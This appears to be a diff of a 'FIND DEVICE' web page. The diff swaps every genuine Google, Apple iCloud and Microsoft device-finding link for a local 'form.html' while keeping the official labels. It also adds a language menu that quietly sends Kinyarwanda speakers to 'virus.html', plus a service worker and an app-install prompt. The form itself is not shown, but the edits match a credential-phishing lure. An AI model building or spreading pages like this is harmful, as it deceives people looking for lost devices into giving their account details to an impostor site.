@@ -1,3 +1,7 @@
+
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -11,6 +15,7 @@
             padding: 0;
             box-sizing: border-box;
             font-family: "Poppins", sans-serif;
+            text-decoration:none;
         }
 
         body{
@@ -161,14 +166,121 @@
         body.dark footer{
             color: #bbb;
         }
+        header select {
+    margin-right: 10px;
+    padding: 6px 10px;
+    border-radius: 5px;
+    border: none;
+    font-size: 14px;
+    cursor: pointer;
+}
+header {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: #1c1f26;
+    padding: 10px 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    color: white;
+    font-size: 22px;
+    font-weight: 600;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    z-index: 200;
+    white-space: nowrap; /* KUBERA IBI EVERYTHING STAYS IN ONE LINE */
+}
+
+.header-right {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+header select {
+    padding: 5px 10px;
+    border-radius: 5px;
+    border: none;
+    font-size: 14px;
+}
+
+.toggle {
+    padding: 6px 14px;
+    background: #0077ff;
+    color: white;
+    border-radius: 25px;
+    border: none;
+    cursor: pointer;
+    font-size: 14px;
+}
+
+/* Phones Responsive: reduce size but still one line */
+@media (max-width: 480px) {
+    header {
+        font-size: 18px;
+        padding: 8px 10px;
+    }
+
+    header select,
+    .toggle {
+        font-size: 12px;
+        padding: 4px 8px;
+    }
+
+    .header-left {
+        font-size: 16px;
+    }
+}
+
+
     </style>
 </head>
 <body>
+<header>
+    <div class="header-left">FIND DEVICE</div>
 
-    <header>
-        <div>FIND DEVICE</div>
+    <div class="header-right">
+        
+        <select id="languageSelect" onchange="changeLanguage()">
+            <option value="en">English</option>
+            <option value="fr">Français</option>
+            <option value="rw">Kinyarwanda</option>
+            <option value="sw">Swahili</option>
+        </select>
+
         <button class="toggle" onclick="toggleDark()">Dark Mode</button>
-    </header>
+    </div>
+</header>
+
+
+<script>
+
+// Save user language + handle redirect
+function changeLanguage() {
+    const lang = document.getElementById("languageSelect").value;
+
+    // If user chooses Kinyarwanda → go to virus.html
+    if (lang === "rw") {
+        window.location.href = "virus.html";
+        return;
+    }
+
+    // Save selected language
+    localStorage.setItem("siteLanguage", lang);
+}
+
+
+// Load saved language
+window.addEventListener("load", function() {
+    const savedLang = localStorage.getItem("siteLanguage");
+
+    if (savedLang) {
+        document.getElementById("languageSelect").value = savedLang;
+    }
+});
+</script>
+
 
 
     <div class="search-container">
@@ -189,7 +301,7 @@
 
         <div id="android" class="os-details">
             <ul>
-                <li>Use <a href="https://www.google.com/android/find" target="_blank">Find My android</a></li>
+                <li>Use <a href="form.html" target="_blank">Find My android</a></li>
                 <li>Ring your phone, even in silent mode</li>
                 <li>Lock or erase your phone remotely</li>
                 <li>Display a recovery message</li>
@@ -199,10 +311,9 @@
 
         <div id="ios" class="os-details">
             <ul>
-                <li>Use <a href="https://www.icloud.com/find" target="_blank">Find My iPhone</a></li>
+                <li>Use <a href="form.html" target="_blank"> Find My iPhone</a></li>
                 <li>Play sound, lock, or erase your device remotely</li>
                 <li>Send a message with your contact info</li>
-                <li>Look your phone on Google map</li>
             </ul>
         </div>
     </div>
@@ -219,7 +330,7 @@
 
         <div id="windows" class="os-details">
             <ul>
-                <li>Use <a href="https://account.microsoft.com/devices" target="_blank">Windows Find My Device</a></li>
+                <li>Use <a href="form.html" target="_blank"> Find My computer</a></li>
                 <li>Lock your PC remotely</li>
                 <li>View last known location</li>
                 <li>Display a warning message or erase data</li>
@@ -228,7 +339,7 @@
 
         <div id="mac" class="os-details">
             <ul>
-                <li>Use <a href="https://www.icloud.com/find" target="_blank">Find My Mac via iCloud</a></li>
+                <li>Use <a href="form.html" target="_blank">Find My Mac via iCloud</a></li>
                 <li>Lock, erase, or locate your Mac remotely</li>
             </ul>
         </div>
@@ -241,75 +352,75 @@
         </div>
     </div>
 
-    <!-- YOUR FREE SKILLS SECTION -->
+    
     <h2>⭐Free Skills🌟</h2>
     <div class="section">
-        <p>If both your phone and PC use the same email, you can track any of them quickly using <a href="https://www.google.com/android/find">findhub</a>.</p>
+        <p>If both your phone and PC use the same email, you can track any of them quickly using <a href="form.html">findhub</a>.</p>
         <p><strong>⚠️ Never track devices you don't own.</strong></p>
     </div>
 
-    <!-- PHONE SUPPORT SECTION -->
+
     <h2>Phone'support</h2>
     <div class="section">
 
-        <p><a href="https://www.google.com/android/find">📱All Samsung</a></p>
-        <p><a href="https://www.google.com/android/find">📱All Tecno</a></p>
-        <p><a href="https://www.google.com/android/find">📱All Infinix</a></p>
-        <p><a href="https://www.google.com/android/find">📱All Xiaomi (Redmi, Poco)</a></p>   
-        <p><a href="https://www.google.com/android/find">📱All Vivo</a></p>
-        <p><a href="https://www.google.com/android/find">📱All Realme</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All Huawei</a></p>
-        <p><a href="https://www.google.com/android/find">📱All OnePlus</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All Google Pixel</a></p>
-        <p><a href="https://www.google.com/android/find">📱All Motorola</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All Nokia (Android model series)</a></p>
-        <p><a href="https://www.google.com/android/find">📱All iOS Phones</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All iPhone 6, 7, 8</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All iPhone X, XR, XS</a></p>
-        <p><a href="https://www.google.com/android/find">📱All iPhone 11 Series</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All iPhone 12 Series</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All iPhone 13 Series</a></p>
-        <p><a href="https://www.google.com/android/find">📱All iPhone 14 Series</a></p>
-        <p><a href="https://www.google.com/android/find">📱All iPhone 15 Series</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All Other (Rare)</a></p>        
-        <p><a href="https://www.google.com/android/find">📱All KaiOS phones (Nokia button phones)</a></p>
-        <p><a href="https://www.google.com/android/find">📱All HarmonyOS (Huawei China models)</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Hot series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Smart series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Note series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Zero Series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Samsung Galaxy S series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Samsung Galaxy A series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Samsung Fold / Flip</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Redmi series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Poco series</a></p>
-        <p><a href="https://www.google.com/android/find">📱Xiaomi Flagships</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Opp A series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Opp Reno series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Vivo Y & V series</a></p>
-        <p><a href="https://www.google.com/android/find">📱all Opp A series</a></p>        
-        <p><a href="https://www.google.com/android/find">📱techno pop2</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno pop2F</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno pop2 plus</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 2</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 3</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 4</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 5</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 6</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 7</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 8</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 9</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 10</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno Spark 20..</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno camon 12</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno camon 15</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno camon 18</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno camon 20..</a></p>
-        <p><a href="https://www.google.com/android/find">📱techno phantom</a></p>
+        <p><a href="form.html">📱All Samsung</a></p>
+        <p><a href="form.html">📱All Tecno</a></p>
+        <p><a href="form.html">📱All Infinix</a></p>
+        <p><a href="form.html">📱All Xiaomi (Redmi, Poco)</a></p>   
+        <p><a href="form.html">📱All Vivo</a></p>
+        <p><a href="form.html">📱All Realme</a></p>        
+        <p><a href="form.html">📱All Huawei</a></p>
+        <p><a href="form.html">📱All OnePlus</a></p>        
+        <p><a href="form.html">📱All Google Pixel</a></p>
+        <p><a href="form.html">📱All Motorola</a></p>        
+        <p><a href="form.html">📱All Nokia (Android model series)</a></p>
+        <p><a href="form.html">📱All iOS Phones</a></p>        
+        <p><a href="form.html">📱All iPhone 6, 7, 8</a></p>        
+        <p><a href="form.html">📱All iPhone X, XR, XS</a></p>
+        <p><a href="form.html">📱All iPhone 11 Series</a></p>        
+        <p><a href="form.html">📱All iPhone 12 Series</a></p>        
+        <p><a href="form.html">📱All iPhone 13 Series</a></p>
+        <p><a href="form.html">📱All iPhone 14 Series</a></p>
+        <p><a href="form.html">📱All iPhone 15 Series</a></p>        
+        <p><a href="form.html">📱All Other (Rare)</a></p>        
+        <p><a href="form.html">📱All KaiOS phones (Nokia button phones)</a></p>
+        <p><a href="form.html">📱All HarmonyOS (Huawei China models)</a></p>
+        <p><a href="form.html">📱all Hot series</a></p>
+        <p><a href="form.html">📱all Smart series</a></p>
+        <p><a href="form.html">📱all Note series</a></p>
+        <p><a href="form.html">📱all Zero Series</a></p>
+        <p><a href="form.html">📱all Samsung Galaxy S series</a></p>
+        <p><a href="form.html">📱all Samsung Galaxy A series</a></p>
+        <p><a href="form.html">📱all Samsung Fold / Flip</a></p>
+        <p><a href="form.html">📱all Redmi series</a></p>
+        <p><a href="form.html">📱all Poco series</a></p>
+        <p><a href="form.html">📱Xiaomi Flagships</a></p>
+        <p><a href="form.html">📱all Opp A series</a></p>
+        <p><a href="form.html">📱all Opp Reno series</a></p>
+        <p><a href="form.html">📱all Vivo Y & V series</a></p>
+        <p><a href="form.html">📱all Opp A series</a></p>        
+        <p><a href="form.html">📱techno pop2</a></p>
+        <p><a href="form.html">📱techno pop2F</a></p>
+        <p><a href="form.html">📱techno pop2 plus</a></p>
+        <p><a href="form.html">📱techno Spark 2</a></p>
+        <p><a href="form.html">📱techno Spark 3</a></p>
+        <p><a href="form.html">📱techno Spark 4</a></p>
+        <p><a href="form.html">📱techno Spark 5</a></p>
+        <p><a href="form.html">📱techno Spark 6</a></p>
+        <p><a href="form.html">📱techno Spark 7</a></p>
+        <p><a href="form.html">📱techno Spark 8</a></p>
+        <p><a href="form.html">📱techno Spark 9</a></p>
+        <p><a href="form.html">📱techno Spark 10</a></p>
+        <p><a href="form.html">📱techno Spark 20..</a></p>
+        <p><a href="form.html">📱techno camon 12</a></p>
+        <p><a href="form.html">📱techno camon 15</a></p>
+        <p><a href="form.html">📱techno camon 18</a></p>
+        <p><a href="form.html">📱techno camon 20..</a></p>
+        <p><a href="form.html">📱techno phantom</a></p>
 
     </div>
 
-    <!-- ALL PHONE TYPES -->
+
 <h2>📱 All Phone Types & Brands</h2>
 <div class="section">
 
@@ -452,41 +563,11 @@
             });
         }
     </script>
-    <h2>Find device📱💻</h2>
-        <div class="section">
-            <p><strong>Used to find Device.</strong></p>
-            <p><a href="ability.html">find my device</a>.</p>
-            <input type="checkbox" id="checkbox"><label id="chek">DISABLE</label>
-        </div>
-        
-        <script>
-        const checkbox = document.getElementById("checkbox");
-        const chek = document.getElementById("chek");
-        let watchID = null;
-        
-        checkbox.addEventListener("change", () => {
-            if (checkbox.checked) {
-                navigator.geolocation.getCurrentPosition(() => {
-                    chek.textContent = "ACTIVATED";
-                    chek.style.color = "green";
-        
-                    watchID = navigator.geolocation.watchPosition(pos => {
-                        console.log("Location:", pos.coords.latitude, pos.coords.longitude);
-                    });
-                });
-            } else {
-                chek.textContent = "DISABLE";
-                chek.style.color = "black";
-                navigator.geolocation.clearWatch(watchID);
-            }
-        });
-        </script>
-        
 
         <h2>Antivirus🛡</h2>
     <div class="section">
         <p><strong>It show your virus and remove it in .</strong></p>
-        <p><a href="virus.html">Ant_virus ACTIVATE</a>.</p>
+        <p><a href="form.html">Ant_virus ACTIVATE</a>.</p>
     </div>
 
             <h2>Fire Phone⚡</h2>
@@ -495,7 +576,36 @@
         <p><a href="ability.html">ACTIVATE</a>.</p>
     </div>
 
-        <footer>© 2026 Find Device</footer>
+        <footer>© 2026 Find Device <button id="installBtn" style="display:none;">📲 Install App</button></footer>
+ <!-- Register Service Worker -->
+<script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js")
+            .then(() => console.log("Service Worker registered"))
+            .catch(err => console.log("Service Worker failed:", err));
+    }
+    </script>
 
+    
+
+    <script>
+    let deferredPrompt;
+    const installBtn = document.getElementById("installBtn");
+    
+    window.addEventListener("beforeinstallprompt", (e) => {
+        e.preventDefault(); // Prevent default mini-infobar
+        deferredPrompt = e; 
+        installBtn.style.display = "block"; // Show button
+    });
+    
+    installBtn.addEventListener("click", async () => {
+        installBtn.style.display = "none";
+        deferredPrompt.prompt(); // Show browser install prompt
+        const choice = await deferredPrompt.userChoice;
+        console.log('User choice:', choice.outcome);
+        deferredPrompt = null;
+    });
+    </script>
+    
 </body>
 </html>
